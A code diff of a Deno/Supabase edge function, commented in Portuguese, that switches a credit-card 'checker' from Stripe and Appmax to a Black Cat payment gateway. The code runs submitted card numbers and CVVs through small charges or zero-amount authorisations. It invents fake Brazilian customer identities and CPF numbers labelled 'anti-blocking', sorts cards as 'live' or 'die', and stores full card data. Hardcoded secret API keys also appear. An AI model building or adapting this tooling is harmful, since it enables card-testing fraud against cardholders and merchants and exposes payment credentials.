@@ -1,6 +1,6 @@
 import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
 import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
-import Stripe from 'https://esm.sh/stripe@11.1.0?target=deno';
+import { encode } from 'https://deno.land/std@0.168.0/encoding/base64.ts';
 
 const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
@@ -13,7 +13,7 @@ interface TestCardRequest {
     expMonth: string;
     expYear: string;
     cvv: string;
-    gatewayUrl?: string;
+    gatewayUrl?: string; // Mantido para compatibilidade, mas ignorado ou usado como log
     processingOrder: number;
     amount?: number;
     proxyUrl?: string;
@@ -21,9 +21,11 @@ interface TestCardRequest {
 }
 
 // ========================================
-// CONFIGURAÇÃO STRIPE (Chaves fornecidas)
+// CONFIGURAÇÃO BLACK CAT (Chaves fornecidas)
 // ========================================
-const STRIPE_SECRET_KEY = Deno.env.get('STRIPE_SECRET_KEY') || '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';
+const BLACKCAT_PUBLIC_KEY = Deno.env.get('BLACKCAT_PUBLIC_KEY') || 'pk_zjH0069PkZun7luIdDfKlu7Z6VkYud0DgM6HNerlfRk9RuZh';
+const BLACKCAT_SECRET_KEY = Deno.env.get('BLACKCAT_SECRET_KEY') || 'sk_atvi-Vbu7A490IU8UbzdP-mSdHyVcMTlnRiO6bH7vZpbyTZy';
+const BLACKCAT_API_URL = 'https://api.blackcatpagamentos.com/v1';
 
 // ========================================
 // GERAÇÃO DE DADOS (Anti-Bloqueio)
@@ -47,7 +49,6 @@ function generateCPF(): string {
 
 const firstNames = ['João', 'Maria', 'José', 'Ana', 'Pedro', 'Juliana', 'Carlos', 'Fernanda', 'Paulo', 'Mariana', 'Lucas', 'Beatriz', 'Rafael', 'Camila', 'Felipe', 'Amanda'];
 const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Costa', 'Ferreira', 'Rodrigues', 'Almeida', 'Nascimento', 'Pereira', 'Carvalho'];
-const products = ['Ebook Marketing Digital', 'Curso Online', 'Mentoria VIP', 'Acesso Premium', 'Pacote de Templates', 'Consultoria Express'];
 
 function generateCustomerData() {
     const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
@@ -55,202 +56,117 @@ function generateCustomerData() {
     const randomNum = Math.floor(Math.random() * 9000) + 1000;
 
     return {
-        firstname: firstName,
-        lastname: lastName,
+        name: `${firstName} ${lastName}`,
         email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}@gmail.com`,
-        telephone: `119${Math.floor(10000000 + Math.random() * 90000000)}`,
-        document_number: generateCPF(),
+        phoneNumber: `119${Math.floor(10000000 + Math.random() * 90000000)}`,
+        documentNumber: generateCPF(),
         address: {
             street: 'Rua das Flores',
             number: Math.floor(Math.random() * 999) + 1,
-            district: 'Centro',
+            neighborhood: 'Centro',
             city: 'São Paulo',
             state: 'SP',
-            zipcode: '01001-000'
+            zipCode: '01001000' // Numeros apenas
         }
     };
 }
 
 // ========================================
-// APPMAX API CLIENT
+// BLACK CAT API CLIENT
 // ========================================
 
-async function appmaxRequest(endpoint: string, method: string, body: any, token: string) {
-    const url = `${Deno.env.get('APPMAX_API_URL') || 'https://api.appmax.com.br/api/v3'}${endpoint}`;
+async function processBlackCatSale(cardData: TestCardRequest) {
+    console.log('🐈 Processing Black Cat Payment...');
 
-    console.log(`📡 Appmax Request: ${method} ${endpoint}`);
-
-    const response = await fetch(url, {
-        method,
-        headers: {
-            'Content-Type': 'application/json',
-            'access-token': token
-        },
-        body: JSON.stringify(body)
-    });
-
-    const data = await response.json();
-
-    if (!response.ok) {
-        console.error(`❌ Appmax Error [${endpoint}]:`, JSON.stringify(data));
-        throw new Error(data.message || `Appmax API Error: ${response.status}`);
-    }
-
-    return data;
-}
-
-async function processAppmaxSale(cardData: TestCardRequest, token: string) {
     const customerData = generateCustomerData();
-    const productName = products[Math.floor(Math.random() * products.length)];
-    const amount = cardData.amount || 1.00;
+    // Default amount 100 cents (R$ 1.00) if not provided. Black Cat expects integer cents.
+    // If cardData.amount is regular float (e.g. 1.00), multiply by 100.
+    // Assuming cardData.amount coming from frontend might be float 1.50 etc.
+    const amountInCents = cardData.amount ? Math.round(cardData.amount * 100) : 100;
 
-    // 1. CRIAR CLIENTE
-    console.log('👤 Creating Customer...');
-    const customerPayload = {
-        firstname: customerData.firstname,
-        lastname: customerData.lastname,
-        email: customerData.email,
-        telephone: customerData.telephone,
-        cpf: customerData.document_number,
-        address_street: customerData.address.street,
-        address_number: customerData.address.number,
-        address_district: customerData.address.district,
-        address_city: customerData.address.city,
-        address_state: customerData.address.state,
-        address_zipcode: customerData.address.zipcode,
-    };
+    const authHeader = `Basic ${encode(`${BLACKCAT_PUBLIC_KEY}:${BLACKCAT_SECRET_KEY}`)}`;
 
-    const customerRes = await appmaxRequest('/customer', 'POST', customerPayload, token);
-    const customerId = customerRes.data?.id;
-
-    if (!customerId) throw new Error('Failed to create customer');
-    console.log(`✅ Customer Created: ${customerId}`);
-
-    // 2. CRIAR PEDIDO
-    console.log('📦 Creating Order...');
-    const orderPayload = {
-        customer_id: customerId,
-        products: [{
-            name: productName,
-            qty: 1,
-            price: amount
-        }],
-        total: amount
-    };
-
-    const orderRes = await appmaxRequest('/order', 'POST', orderPayload, token);
-    const orderId = orderRes.data?.id;
-
-    if (!orderId) throw new Error('Failed to create order');
-    console.log(`✅ Order Created: ${orderId}`);
-
-    // 3. PROCESSAR PAGAMENTO
-    console.log('💳 Processing Payment...');
-    const paymentPayload = {
-        order_id: orderId,
-        payment: {
-            CreditCard: {
-                number: cardData.cardNumber,
-                cvv: cardData.cvv,
-                month: cardData.expMonth,
-                year: cardData.expYear,
-                installments: 1,
-                name: `${customerData.firstname} ${customerData.lastname}`.toUpperCase()
+    const payload = {
+        amount: amountInCents,
+        paymentMethod: "credit_card",
+        installments: 1,
+        card: {
+            holder: customerData.name.toUpperCase(),
+            number: cardData.cardNumber.replace(/\D/g, ''),
+            expirationMonth: cardData.expMonth,
+            expirationYear: cardData.expYear.slice(-2), // YY format often needed, checking input. If input is YYYY, slice it.
+            securityCode: cardData.cvv
+        },
+        customer: {
+            name: customerData.name,
+            email: customerData.email,
+            documentNumber: customerData.documentNumber,
+            phoneNumber: customerData.phoneNumber,
+            address: {
+                street: customerData.address.street,
+                number: customerData.address.number,
+                neighborhood: customerData.address.neighborhood,
+                city: customerData.address.city,
+                state: customerData.address.state,
+                zipCode: customerData.address.zipCode
             }
         }
     };
 
-    const paymentRes = await appmaxRequest('/payment/credit-card', 'POST', paymentPayload, token);
-
-    return {
-        success: true,
-        status: paymentRes.data?.status === 'approved' ? 'live' : 'die',
-        message: paymentRes.message || 'Transaction processed',
-        raw: paymentRes
-    };
-}
-
-// ========================================
-// STRIPE API CLIENT
-// ========================================
-
-async function processStripeSale(cardData: TestCardRequest, secretKey: string) {
-    const stripe = new Stripe(secretKey, { httpClient: Stripe.createFetchHttpClient() });
-
-    console.log('💳 Processing Stripe Payment (0 Auth / SetupIntent)...');
+    console.log('📤 Payload:', JSON.stringify(payload, null, 2));
 
     try {
-        let paymentMethodId;
-
-        // Se recebermos um TOKEN (do frontend), criamos um PaymentMethod a partir dele
-        if (cardData.token) {
-            console.log('🔑 Using Frontend Token:', cardData.token);
-            const pm = await stripe.paymentMethods.create({
-                type: 'card',
-                card: { token: cardData.token }
-            });
-            paymentMethodId = pm.id;
-        } else {
-            // Fallback: Tenta criar token no backend (Geralmente falha com chaves Live sem PCI)
-            console.warn('⚠️ No token provided, attempting backend tokenization (May fail)');
-            const token = await stripe.tokens.create({
-                card: {
-                    number: cardData.cardNumber,
-                    exp_month: cardData.expMonth,
-                    exp_year: cardData.expYear,
-                    cvc: cardData.cvv,
-                },
-            });
-            const pm = await stripe.paymentMethods.create({
-                type: 'card',
-                card: { token: token.id }
-            });
-            paymentMethodId = pm.id;
-        }
-
-        // 0 Auth: Criar SetupIntent e confirmar
-        const setupIntent = await stripe.setupIntents.create({
-            payment_method: paymentMethodId,
-            confirm: true,
-            usage: 'off_session', // Indica que queremos salvar para uso futuro (validação robusta)
-            automatic_payment_methods: { enabled: true, allow_redirects: 'never' } // Evita redirects 3DS se possível
+        const response = await fetch(`${BLACKCAT_API_URL}/transactions`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': authHeader
+            },
+            body: JSON.stringify(payload)
         });
 
-        // Verifica status
+        const data = await response.json();
+        console.log(`📥 API Response [${response.status}]:`, JSON.stringify(data));
+
         let status = 'die';
-        if (setupIntent.status === 'succeeded') {
-            status = 'live';
-        } else if (setupIntent.status === 'requires_payment_method') {
-            status = 'die'; // Cartão recusado
-        } else if (setupIntent.status === 'requires_action') {
-            status = 'live'; // 3DS necessário = Cartão válido (geralmente)
+        // Mapeamento de resposta Black Cat
+        // Sucesso geralmente é 200/201. Status dentro do body: "paid", "authorized" etc.
+        // Baseado em gateways similares (Pagar.me/Mundipagg/etc), e doc lida:
+        // Ajustar conforme payload real retornado.
+        if (response.ok) {
+            const txStatus = data.status?.toLowerCase();
+            if (['paid', 'authorized', 'captured'].includes(txStatus)) {
+                status = 'live';
+            } else if (txStatus === 'refused' || txStatus === 'failed') {
+                status = 'die';
+            } else {
+                // Pode ser pending ou processing, tratamos como unknown ou die no contexto de checker?
+                // Checkers geralmente querem saber se passou na hora.
+                status = 'unknown';
+            }
+        } else {
+            // Erro na requisição (400, 401, etc)
+            if (data.message && data.message.toLowerCase().includes('recusado')) {
+                status = 'die';
+            } else {
+                status = 'die'; // Default p/ erro assumimos falha
+            }
         }
 
         return {
             success: true,
             status: status,
-            message: setupIntent.last_setup_error?.message || setupIntent.status,
-            raw: setupIntent
+            message: data.message || data.status || 'Transaction processed',
+            raw: data
         };
 
     } catch (error: any) {
-        console.error('❌ Stripe Error:', error.message);
-
-        // Mapeamento de erros Stripe
-        let status = 'die';
-        if (error.code === 'card_declined') {
-            status = 'die';
-        } else if (error.type === 'StripeCardError') {
-            status = 'die';
-        } else {
-            status = 'unknown';
-        }
-
+        console.error('❌ Black Cat Request Error:', error.message);
         return {
             success: false,
-            status: status,
+            status: 'error',
             message: error.message,
-            raw: error
+            raw: null
         };
     }
 }
@@ -276,58 +192,18 @@ serve(async (req) => {
         }
 
         const startTime = Date.now();
-        let result;
-        let gatewayUsed = 'APPMAX';
 
-        try {
-            // DECISÃO DE GATEWAY
-            if (STRIPE_SECRET_KEY && STRIPE_SECRET_KEY.startsWith('sk_')) {
-                gatewayUsed = 'STRIPE';
-                const saleResult = await processStripeSale(requestData, STRIPE_SECRET_KEY);
+        // FORCED to Black Cat for migration
+        const gatewayUsed = 'BLACK_CAT';
+        const result = await processBlackCatSale(requestData);
 
-                result = {
-                    status: saleResult.status,
-                    message: saleResult.message,
-                    amount: amount,
-                    responseTimeMs: Date.now() - startTime
-                };
-            } else {
-                // Fallback para Appmax
-                const token = Deno.env.get('APPMAX_ACCESS_TOKEN');
-                if (!token) throw new Error('Nenhum gateway configurado (Appmax ou Stripe)');
-
-                const saleResult = await processAppmaxSale(requestData, token);
-
-                // Mapeamento Appmax
-                const statusMap: any = {
-                    'approved': 'live',
-                    'authorized': 'live',
-                    'paid': 'live',
-                    'refused': 'die',
-                    'refunded': 'die',
-                    'charged_back': 'die',
-                    'pending': 'unknown'
-                };
-                const apiStatus = saleResult.raw.data?.status?.toLowerCase() || 'unknown';
-                const finalStatus = statusMap[apiStatus] || 'die';
-
-                result = {
-                    status: finalStatus,
-                    message: saleResult.message,
-                    amount: amount,
-                    responseTimeMs: Date.now() - startTime
-                };
-            }
-
-        } catch (err: any) {
-            console.error('❌ Payment Process Error:', err.message);
-            result = {
-                status: 'unknown',
-                message: err.message,
-                amount: amount,
-                responseTimeMs: Date.now() - startTime
-            };
-        }
+        // Normalize response for frontend
+        const finalResult = {
+            status: result.status,
+            message: result.message,
+            amount: amount || 0,
+            responseTimeMs: Date.now() - startTime
+        };
 
         // Salva resultado
         await supabaseClient.from('card_test_results').insert([{
@@ -338,14 +214,14 @@ serve(async (req) => {
             cvv: cvv,
             gateway_url: gatewayUsed,
             processing_order: processingOrder,
-            status: result.status,
-            message: result.message,
-            amount: result.amount,
-            response_time_ms: result.responseTimeMs
+            status: finalResult.status,
+            message: finalResult.message,
+            amount: finalResult.amount,
+            response_time_ms: finalResult.responseTimeMs
         }]);
 
         return new Response(
-            JSON.stringify({ success: true, testResult: result }),
+            JSON.stringify({ success: true, testResult: finalResult }),
             { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
         );
 
